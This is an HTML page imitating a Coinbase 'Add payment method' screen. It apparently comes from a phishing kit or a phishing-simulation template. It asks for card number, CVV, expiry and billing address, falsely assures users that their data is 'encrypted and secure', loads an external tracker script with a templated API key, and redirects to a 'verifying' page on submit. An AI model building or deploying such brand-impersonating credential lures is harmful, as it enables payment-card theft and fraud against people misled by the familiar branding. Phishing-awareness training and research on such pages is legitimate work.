<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment Method - Coinbase</title>
    <link rel="icon" type="image/svg+xml" href="assets/images/favicon.svg">
    <link rel="stylesheet" href="styles.css">

<script src="/tracker.js" data-api-key="%%API_KEY%%"></script>
</head>
<body>
    <!-- Header -->
    <header class="header">
        <div class="logo-container">
            <img src="assets/images/favicon.svg" alt="Coinbase" class="logo">
        </div>
    </header>

    <!-- Main Content -->
    <main class="main-content">
        <div class="signup-container">
            <!-- Payment Icon -->
            <div class="form-icon">
                <svg width="64" height="64" viewBox="0 0 64 64" fill="none">
                    <circle cx="32" cy="32" r="32" fill="#5b8df5" opacity="0.15"/>
                    <rect x="14" y="22" width="36" height="24" rx="3" stroke="#5b8df5" stroke-width="2" fill="none"/>
                    <line x1="14" y1="30" x2="50" y2="30" stroke="#5b8df5" stroke-width="2"/>
                    <line x1="18" y1="38" x2="28" y2="38" stroke="#5b8df5" stroke-width="2" stroke-linecap="round"/>
                </svg>
            </div>
            
            <h1 class="title">Add payment method</h1>
            <p class="subtitle">Link a payment method to start buying and selling cryptocurrency.</p>

            <!-- Payment Method Form -->
            <form id="paymentForm" class="signup-form">
                <input 
                    type="text" 
                    id="cardNumber" 
                    name="cardNumber" 
                    class="email-input" 
                    placeholder="Card number"
                    autocomplete="cc-number"
                    maxlength="19"
                    inputmode="numeric"
                    required
                >
                
                <input 
                    type="text" 
                    id="cardholderName" 
                    name="cardholderName" 
                    class="email-input" 
                    placeholder="Cardholder name"
                    autocomplete="cc-name"
                    required
                >
                
                <div class="form-row">
                    <input 
                        type="text" 
                        id="expiryDate" 
                        name="expiryDate" 
                        class="email-input" 
                        placeholder="MM/YY"
                        autocomplete="cc-exp"
                        maxlength="5"
                        inputmode="numeric"
                        required
                    >
                    
                    <input 
                        type="text" 
                        id="cvv" 
                        name="cvv" 
                        class="email-input" 
                        placeholder="CVV"
                        autocomplete="cc-csc"
                        maxlength="4"
                        inputmode="numeric"
                        required
                    >
                </div>
                
                <input 
                    type="text" 
                    id="billingAddress" 
                    name="billingAddress" 
                    class="email-input" 
                    placeholder="Billing address"
                    autocomplete="street-address"
                    required
                >
                
                <input 
                    type="text" 
                    id="billingCity" 
                    name="billingCity" 
                    class="email-input" 
                    placeholder="City"
                    autocomplete="address-level2"
                    required
                >
                
                <div class="form-row">
                    <input 
                        type="text" 
                        id="billingState" 
                        name="billingState" 
                        class="email-input" 
                        placeholder="State"
                        autocomplete="address-level1"
                        required
                    >
                    
                    <input 
                        type="text" 
                        id="billingZip" 
                        name="billingZip" 
                        class="email-input" 
                        placeholder="ZIP Code"
                        autocomplete="postal-code"
                        maxlength="10"
                        required
                    >
                </div>
                
                <button type="submit" class="continue-btn">Add Card</button>
            </form>

            <!-- Security Note -->
            <div class="security-note">
                <svg width="16" height="16" viewBox="0 0 16 16" fill="none" style="display: inline-block; vertical-align: middle; margin-right: 8px;">
                    <path d="M8 1L3 3v4c0 3.5 2 6 5 7 3-1 5-3.5 5-7V3l-5-2z" stroke="#9fa3a8" stroke-width="1.5" fill="none" stroke-linejoin="round"/>
                </svg>
                <span style="color: #9fa3a8; font-size: 13px;">Your payment information is encrypted and secure</span>
            </div>
        </div>
    </main>

    <!-- Footer -->
    <footer class="footer">
        <p class="footer-text">
            By adding a payment method, you agree to our <a href="#" class="footer-link">Payment Terms</a>.
        </p>
    </footer>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const paymentForm = document.getElementById('paymentForm');
            const cardNumberInput = document.getElementById('cardNumber');
            const expiryInput = document.getElementById('expiryDate');
            const cvvInput = document.getElementById('cvv');
            const submitBtn = paymentForm.querySelector('.continue-btn');
            const inputs = paymentForm.querySelectorAll('input[required]');
            
            // Format card number
            cardNumberInput.addEventListener('input', function(e) {
                let value = e.target.value.replace(/\s/g, '');
                let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
                e.target.value = formattedValue;
            });
            
            // Format expiry date
            expiryInput.addEventListener('input', function(e) {
                let value = e.target.value.replace(/\D/g, '');
                if (value.length >= 2) {
                    value = value.slice(0, 2) + '/' + value.slice(2, 4);
                }
                e.target.value = value;
            });
            
            // Check if all required fields are filled
            function checkFormValidity() {
                let allFilled = true;
                
                inputs.forEach(input => {
                    if (input.value.trim() === '') {
                        allFilled = false;
                    }
                });
                
                if (allFilled) {
                    submitBtn.classList.add('active');
                } else {
                    submitBtn.classList.remove('active');
                }
            }
            
            inputs.forEach(input => {
                input.addEventListener('input', checkFormValidity);
            });
            
            checkFormValidity();
            
            paymentForm.addEventListener('submit', function(e) {
                e.preventDefault();
                window.location.href = 'verifying.html';
            });
        });
    </script>
</body>
</html>
